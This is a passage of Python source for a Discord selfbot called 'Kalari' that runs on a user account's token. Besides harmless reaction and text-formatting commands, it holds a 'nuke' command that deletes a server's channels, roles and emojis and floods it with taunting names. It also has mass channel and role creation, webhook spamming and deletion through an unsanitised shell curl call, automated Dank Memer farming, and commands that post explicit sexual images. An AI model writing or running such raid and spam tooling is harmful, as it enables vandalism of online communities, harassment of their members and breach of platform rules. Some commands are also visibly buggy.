    slapembed = discord.Embed(title = f'''You Slap {ctx.message.mentions[0].name + '#' + ctx.message.mentions[0].discriminator}!''', color=0x56aeec)
    slapembed_title = slapembed.title
    slapembed.set_footer(text=f"Kalari ~ Selfbot")
    slapembed.set_image(url=slap["link"])
    try: await ctx.send(embed=slapembed)
    except:
        await ctx.send(slap['link'])

@Kalari.command()
async def pat(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Pat]'''+Fore.RESET)
    pat = requests.get('https://purrbot.site/api/img/sfw/pat/gif').json()
    patembed = discord.Embed(title = f'''You Pat {ctx.message.mentions[0].name + '#' + ctx.message.mentions[0].discriminator}!''', color=0x56aeec)
    patembed_title = patembed.title
    patembed.set_footer(text=f"Kalari ~ Selfbot")
    patembed.set_image(url=pat["link"])
    try: await ctx.send(embed=patembed)
    except:
        await ctx.send(pat['link'])

@Kalari.command()
async def tickle(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Tickle]'''+Fore.RESET)
    tickle = requests.get('https://purrbot.site/api/img/sfw/tickle/gif').json()
    tickleembed = discord.Embed(title = f'''You Tickle'd {ctx.message.mentions[0].name + '#' + ctx.message.mentions[0].discriminator}!''', color=0x56aeec)
    tickleembed_title = tickleembed.title
    tickleembed.set_footer(text=f"Kalari ~ Selfbot")
    tickleembed.set_image(url=tickle["link"])
    try: await ctx.send(embed=tickleembed)
    except:
        await ctx.send(tickle['link'])
	
@Kalari.command()
async def hentai(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Hentai]'''+Fore.RESET)
    hentai = requests.get('https://nekos.life/api/v2/img/Random_hentai_gif').json()
    hentaiembed = discord.Embed(color=0x56aeec)
    hentaiembed_title = hentaiembed.title
    hentaiembed.set_footer(text=f"Kalari ~ Selfbot")
    hentaiembed.set_image(url=hentai["url"])
    try: await ctx.send(embed=hentaiembed)
    except:
        await ctx.send(hentai['url'])

@Kalari.command()
async def anal(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Anal]'''+Fore.RESET)
    anal = requests.get('https://nekos.life/api/v2/img/anal').json()
    analembed = discord.Embed(color=0x56aeec)
    analembed_title = analembed.title
    analembed.set_footer(text=f"Kalari ~ Selfbot")
    analembed.set_image(url=anal["url"])
    try: await ctx.send(embed=analembed)
    except:
        await ctx.send(anal['url'])

@Kalari.command()
async def boobs(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Boobs]'''+Fore.RESET)
    boobs = requests.get('https://nekos.life/api/v2/img/boobs').json()
    boobsembed = discord.Embed(color=0x56aeec)
    boobsembed_title = boobsembed.title
    boobsembed.set_footer(text=f"Kalari ~ Selfbot")
    boobsembed.set_image(url=boobs["url"])
    try: await ctx.send(embed=boobsembed)
    except:
        await ctx.send(boobs['url'])

@Kalari.command()
async def tits(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Tits]'''+Fore.RESET)
    tits = requests.get('https://nekos.life/api/v2/img/tits').json()
    titsembed = discord.Embed(color=0x56aeec)
    titsembed_title = titsembed.title
    titsembed.set_footer(text=f"Kalari ~ Selfbot")
    titsembed.set_image(url=tits["url"])
    try: await ctx.send(embed=titsembed)
    except:
        await ctx.send(tits['url'])

@Kalari.command()
async def blowjob(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Blowjob]'''+Fore.RESET)
    blowjob = requests.get('https://nekos.life/api/v2/img/blowjob').json()
    blowjobembed = discord.Embed(color=0x56aeec)
    blowjobembed_title = blowjobembed.title
    blowjobembed.set_footer(text=f"Kalari ~ Selfbot")
    blowjobembed.set_image(url=blowjob["url"])
    try: await ctx.send(embed=blowjobembed)
    except:
        await ctx.send(blowjob['url'])

@Kalari.command()
async def pussy(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Pussy]'''+Fore.RESET)
    pussy = requests.get('https://nekos.life/api/v2/img/blowjob').json()
    pussyembed = discord.Embed(color=0x56aeec)
    pussyembed_title = pussyembed.title
    pussyembed.set_footer(text=f"Kalari ~ Selfbot")
    pussyembed.set_image(url=pussy["url"])
    try: await ctx.send(embed=pussyembed)
    except:
        await ctx.send(pussy['url'])

@Kalari.command()
async def pid(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Pid]'''+Fore.RESET)
    print(f'''[K]{Fore.LIGHTBLACK_EX} {ctx.message.mentions[0]} user id is {ctx.message.mentions[0].id}, copied user id to your keyboard!'''+Fore.RESET)
    pyperclip.copy(f'''{ctx.message.mentions[0].id}''') # if this doesnt work dm flacreset#0001
	

@Kalari.command()
async def whois(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

@Kalari.command()
async def leavegroups(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Leavegroups]'''+Fore.RESET)
    for channel in Kalari.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Kalari.command()
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        _V_co = "123456789" # input whatever message you want to spam the groupchat
        args = ""
        for letter in _V_co:
            args = args + letter
            await ctx.message.channel.edit(name=args)
		
@Kalari.command()
async def masschannels(ctx, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Masschannels]'''+Fore.RESET)
    for _i in range(250):
        await ctx.guild.create_text_channel(name=message)

@Kalari.command()
async def voicechannels(ctx, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [VoiceChannels]'''+Fore.RESET)
    for i in range(250):
        await ctx.guild.create_voice_channel(name=message)

@Kalari.command()
async def delchannels(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [DelChannels]'''+Fore.RESET)
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Kalari.command()
async def massrole(ctx, message):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Massrole]'''+Fore.RESET)
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=message)
        except:
            try:
                await ctx.guild.create_role(name=message)
            except:
                return

@Kalari.command()
async def delroles(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Delroles]'''+Fore.RESET)
    for role in list(ctx.guild.roles):
        print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Deleting Roles..'''+Fore.RESET)
        try: await role.delete()
        except: pass

@Kalari.command()
async def delemojis(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Delemojis]'''+Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        print(f'''{Fore.BLUE}[!] {Fore.WHITE}Deleting Emojis..'''+Fore.RESET)
        try:
            await emoji.delete()
        except:
            pass

@Kalari.command()
async def guildname(ctx, message):
  await ctx.message.delete()
  print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Guildname]'''+Fore.RESET)
  await ctx.guild.edit(name=message)

@Kalari.command()
async def nuke(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[LOG] {Fore.WHITE}Command ran [Nuke]'''+Fore.RESET)
    for channel in list(ctx.guild.channels):
        print(f'''{Fore.BLUE}[!] {Fore.WHITE}Deleting Channels..'''+Fore.RESET)
        try:
            await channel.delete()
        except:
            return
    for role in list(ctx.guild.roles):
        print(f'''{Fore.BLUE}[!] {Fore.WHITE}Deleting Roles..'''+Fore.RESET)
        try:
            await role.delete()
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
    for _i in range(150):
            await ctx.guild.edit(name='Kalari Runs You') # you can change the names here if you'd like
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Server Name'''+Fore.RESET)
            await ctx.guild.create_voice_channel(name='NiceServerBro')
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Voice Channel'''+Fore.RESET)
            await ctx.guild.create_voice_channel(name='Kalari Winning')
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Voice Channel'''+Fore.RESET)
            await ctx.guild.create_text_channel(name='YouJustGotBeamed')
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Text Channel'''+Fore.RESET)
            await ctx.guild.create_text_channel(name='flacreset & pwn run you')
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Text Channel'''+Fore.RESET)
            await ctx.guild.create_role(name='Kalari Winning')
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Role'''+Fore.RESET)
            await ctx.guild.create_role(name='Fix Ur Server Bro')
            print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Role'''+Fore.RESET)
		
@Kalari.command()
async def stopall(ctx):
    await ctx.message.delete()
    stopall.has_been_called = True
    print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE} [PLS-BEG] - Stopped all dank member stuff.'''+Fore.RESET)
    pass
stopall.has_been_called = False

@Kalari.command()
async def plsbeg(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[!]{Fore.WHITE} [WARNING] - {Fore.YELLOW}FARMING CAN GET YOU BLACKLISTED! I RECOMMEND YOU FARMING FOR 3 HOURS PER DAY'''+Fore.RESET)
    while True:
            await ctx.send('pls beg')           
            print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}[PLS-BEG] - Running'''+Fore.RESET)
            await asyncio.sleep(45)
            if stopall.has_been_called:
                break

@Kalari.command()
async def plsfish(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[!]{Fore.WHITE} [WARNING] - {Fore.YELLOW}FARMING CAN GET YOU BLACKLISTED! I RECOMMEND YOU FARMING FOR 3 HOURS PER DAY'''+Fore.RESET)
    while True:
        await ctx.send('pls fish')
        print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}[PLS-FISH] - Running'''+Fore.RESET)
        await asyncio.sleep(40)
        if stopall.has_been_called:
                break

@Kalari.command()
async def plshunt(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[!]{Fore.WHITE} [WARNING] - {Fore.YELLOW}FARMING CAN GET YOU BLACKLISTED! I RECOMMEND YOU FARMING FOR 3 HOURS PER DAY'''+Fore.RESET)
    while True:
        await ctx.send('pls hunt')
        print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}[PLS-HUNT] - Running'''+Fore.RESET)
        await asyncio.sleep(40)
        if stopall.has_been_called:
                break

@Kalari.command()
async def plswork(ctx):
    await ctx.message.delete()
    print(f'''{Fore.LIGHTBLACK_EX}[!]{Fore.WHITE} [WARNING] - {Fore.YELLOW}FARMING CAN GET YOU BLACKLISTED! I RECOMMEND YOU FARMING FOR 3 HOURS PER DAY'''+Fore.RESET)
    while True:
        await ctx.send('pls work')
        print(f'''{Fore.LIGHTBLACK_EXLIGHTBLACK_EX}[!] {Fore.WHITE}[PLS-WORK] - Running'''+Fore.RESET)
        await asyncio.sleep(3600)
        if stopall.has_been_called:
                break

@Kalari.command()
async def delwebhook(ctx, webhook):
    await ctx.message.delete()
    os.system(f'curl -X DELETE {webhook}')
    print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Successfully Deleted The Webhook!'''+Fore.RESET)

@Kalari.command()
async def sendwebhook(ctx, webhook, message):
    await ctx.message.delete()
    vars = DiscordWebhook(url=webhook, content=message)
    vars.execute()
    print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Successfully Sent The Message To The Webhook!'''+Fore.RESET)

@Kalari.command()
async def spamwebhook(ctx, webhook, message):
    await ctx.message.delete()
    while Kalari:
        vars = DiscordWebhook(url=webhook, content=message)
        vars.execute()
        await asyncio.sleep(0.5)
        print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE}Spamming The Webhook'''+Fore.RESET)
        if stopspamwebhook.has_been_called:
            break

@Kalari.command(aliases=["stopwebhook", "stopspamweb", "stophook", "stopweb"])
async def stopspamwebhook(ctx):
    await ctx.message.delete()
    stopspamwebhook.has_been_called = True
    print(f'''{Fore.LIGHTBLACK_EX}[!] {Fore.WHITE} [Spam-Webhook] - Stopped spamming webhooks.'''+Fore.RESET)
    pass
stopspamwebhook.has_been_called = False

@Kalari.command()
async def Kalaris(ctx):
    await ctx.message.delete()
    KALARI = ['K', 'KA', 'KAL', 'KALA', 'KALAR', 'KALARI', 'KALARI W', 'KALARI WI', 'KALARI WIN', 'KALARI WINN', 'KALARI WINNI', 'KALARI WINNIN', 'KALARI WINNING', 'KALARI WINNING :', 'KALARI WINNING :D']
    message = await ctx.send(KALARI[0])
    await asyncio.sleep(2)
    for next in KALARI[1:]:
        await message.edit(content=next)
        await asyncio.sleep(0.5)

@Kalari.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=25).flatten()
    for message in messages:
        await message.add_reaction(emote)

@Kalari.command()
async def reverse(ctx, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)

@Kalari.command()
async def bold(ctx, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')

@Kalari.command()
async def censor(ctx, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')

@Kalari.command()
async def underline(ctx, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')

@Kalari.command()
async def italicize(ctx, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')

@Kalari.command()
async def strike(ctx, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')

@Kalari.command()
async def quote(ctx, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)

@Kalari.command()
async def hackertext(ctx, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")

@Kalari.command()
async def shutdown(ctx):
    await ctx.message.delete()
    await Kalari.logout()

Kalari.run(token, bot=False)
